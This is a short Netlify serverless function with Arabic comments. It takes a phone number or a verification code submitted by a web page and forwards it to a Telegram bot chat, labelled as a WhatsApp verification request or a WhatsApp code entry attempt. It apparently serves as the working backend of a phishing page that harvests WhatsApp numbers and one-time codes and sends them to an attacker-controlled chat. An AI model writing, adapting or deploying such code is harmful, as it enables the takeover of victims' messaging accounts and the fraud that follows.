// netlify/functions/sendMessage.js
import fetch from "node-fetch";

export async function handler(event) {
  try {
    // قراءة البيانات المرسلة من الواجهة
    const body = JSON.parse(event.body);
    const { type, text } = body;

    // التوكن والـ chat ID مخزنين في البيئة
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return {
        statusCode: 500,
        body: JSON.stringify({ error: "BOT_TOKEN or CHAT_ID not set" })
      };
    }

    // تحديد نص الرسالة بناءً على النوع
    const msg = type === "phone"
      ? `📞 طلب توثيق جديد (واتساب)\nالرقم: ${text}`
      : `🔐 محاولة إدخال كود (واتساب)\nالكود: ${text}`;

    // إرسال الرسالة عبر Telegram API
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    });

    const data = await response.json();

    return {
      statusCode: 200,
      body: JSON.stringify(data)
    };

  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
}
